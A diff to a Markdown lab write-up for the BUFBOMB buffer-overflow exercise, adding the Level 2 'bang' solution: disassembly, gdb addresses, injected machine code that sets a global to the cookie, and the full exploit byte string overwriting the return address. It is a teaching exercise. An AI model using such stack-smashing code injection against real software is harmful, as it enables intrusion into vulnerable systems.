@@ -48,7 +48,7 @@ Target: get BUFBOMB to execute the code for `fizz` with argument `cookie`
 
 Assembly code of `fizz`:
 
-```
+```assembly
 08049442 <fizz>:
  8049442:	55                   	push   %ebp
  8049443:	89 e5                	mov    %esp,%ebp
@@ -90,4 +90,74 @@ Therefore, the string should be:
 00 00 00 00 00 00 00 00
 00 00 42 94 04 08 00 00
 00 00 21 05 ba 20
+```
+
+## Level 2: Firecracker/bang
+
+Target: get BUFBOMB to execute the code for bang with setting global_value as cookie
+
+Assembly code of `bang`:
+
+```assembly
+08049493 <bang>:
+ 8049493:	55                   	push   %ebp
+ 8049494:	89 e5                	mov    %esp,%ebp
+ 8049496:	83 ec 08             	sub    $0x8,%esp
+ 8049499:	a1 98 d1 04 08       	mov    0x804d198,%eax
+ 804949e:	89 c2                	mov    %eax,%edx
+ 80494a0:	a1 90 d1 04 08       	mov    0x804d190,%eax
+ 80494a5:	39 c2                	cmp    %eax,%edx           # compare *0x804d198 and *0x804d190
+ 80494a7:	75 25                	jne    80494ce <bang+0x3b>
+ 80494a9:	a1 98 d1 04 08       	mov    0x804d198,%eax
+ 80494ae:	83 ec 08             	sub    $0x8,%esp
+ 80494b1:	50                   	push   %eax
+ 80494b2:	68 64 b0 04 08       	push   $0x804b064
+ 80494b7:	e8 c4 fb ff ff       	call   8049080 <printf@plt>
+ 80494bc:	83 c4 10             	add    $0x10,%esp
+ 80494bf:	83 ec 0c             	sub    $0xc,%esp
+ 80494c2:	6a 02                	push   $0x2
+ 80494c4:	e8 17 09 00 00       	call   8049de0 <validate>
+ 80494c9:	83 c4 10             	add    $0x10,%esp
+ 80494cc:	eb 16                	jmp    80494e4 <bang+0x51>
+ 80494ce:	a1 98 d1 04 08       	mov    0x804d198,%eax
+ 80494d3:	83 ec 08             	sub    $0x8,%esp
+ 80494d6:	50                   	push   %eax
+ 80494d7:	68 89 b0 04 08       	push   $0x804b089
+ 80494dc:	e8 9f fb ff ff       	call   8049080 <printf@plt>
+ 80494e1:	83 c4 10             	add    $0x10,%esp
+ 80494e4:	83 ec 0c             	sub    $0xc,%esp
+ 80494e7:	6a 00                	push   $0x0
+ 80494e9:	e8 62 fc ff ff       	call   8049150 <exit@plt>
+```
+
+According to gdb, <global_value> locates in `0x804d198`, while <cookie> locates in `0x804d190`.
+We need to set <golobal_value> to <cookie> value via assembly code, and finally step into
+`bang` locating in `0x08049493`:
+
+```assembly
+00000000 <.text>:
+   0:	c7 05 98 d1 04 08 21 	movl   $0x20ba0521,0x804d198
+   7:	05 ba 20
+   a:	68 93 94 04 08       	push   $0x8049493
+   f:	c3                   	ret
+```
+
+Store the assembly code to <buf> and return to there so that program can execute it.
+Before doing that, we need to find out where it is => use gdb with `x $ebp` => `0x5568fa40`
+
+* 0~15: assembly code
+* 16~49: nothing
+* 50~53: buf address
+
+```
+c7 05 98 d1 04 08 21
+05 ba 20
+68 93 94 04 08
+c3
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00 00 00 00 00 00 00
+00 00
+40 fa 68 55
 ```
